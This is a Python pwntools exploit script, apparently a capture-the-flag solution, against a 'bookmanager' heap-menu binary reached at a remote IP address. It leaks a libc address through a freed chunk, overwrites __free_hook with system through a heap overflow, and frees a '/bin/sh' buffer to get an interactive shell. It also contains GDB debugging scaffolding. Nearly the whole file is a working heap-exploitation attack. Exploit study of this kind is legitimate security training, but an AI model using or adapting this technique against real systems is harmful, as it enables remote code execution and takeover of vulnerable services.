#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './bookmanager'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('47.112.115.30', 13337)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b *$rebase(0x134A)
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def Add_chapter(c_name):
    sh.sendlineafter('Your choice:', '1')
    sh.sendafter('Chapter name:', c_name)

def Add_section(c_name, s_name):
    sh.sendlineafter('Your choice:', '2')
    sh.sendafter('Which chapter do you want to add into:', c_name)
    sh.sendafter('Section name:', s_name)

def Add_text(s_name, size, text):
    sh.sendlineafter('Your choice:', '3')
    sh.sendafter('Which section do you want to add into:', s_name)
    sh.sendlineafter('How many chapters you want to write:', str(size))
    sh.sendafter('Text:', text)

def Remove_text(s_name):
    sh.sendlineafter('Your choice:', '6')
    sh.sendafter('Section name:', s_name)

def Book_preview():
    sh.sendlineafter('Your choice:', '7')

def Update(s_name, text):
    sh.sendlineafter('Your choice:', '8')
    sh.sendlineafter('hat to update?(Chapter/Section/Text):', 'Text')
    sh.sendafter('Section name:', s_name)
    sh.sendafter('New Text:', text)

sh.recvuntil('Name of the book you want to create: ')
sh.send('a' * 30)

Add_chapter('aaaa\n')
Add_section('aaaa\n', 'bbbb\n')
Add_section('aaaa\n', 'cccc\n')
Add_text('bbbb\n', 0x88, '\n')
Add_text('cccc\n', 0x68, 'here\n')

Remove_text('bbbb\n')
Add_text('bbbb\n', 0x88, '\x78')
Book_preview()

sh.recvuntil('Section:bbbb')
sh.recvuntil('Text:')

result = sh.recvline()[:-1]
main_arena_addr = u64(result.ljust(8, '\0')) - 88
log.success('main_arena_addr: ' + hex(main_arena_addr))

libc_addr = main_arena_addr - (libc.symbols['__malloc_hook'] + 0x10)
log.success('libc_addr: ' + hex(libc_addr))

Add_section('aaaa\n', 'dddd\n')
Update('cccc\n', '/bin/sh\0'.ljust(0x60, '\0') + p64(0) + p64(0x41) + 'dddd'.ljust(0x20, '\0') + p64(libc_addr + libc.symbols['__free_hook']))
Update('dddd\n', p64(libc_addr + libc.symbols['system']))

Remove_text('cccc\n')

sh.interactive()
clear()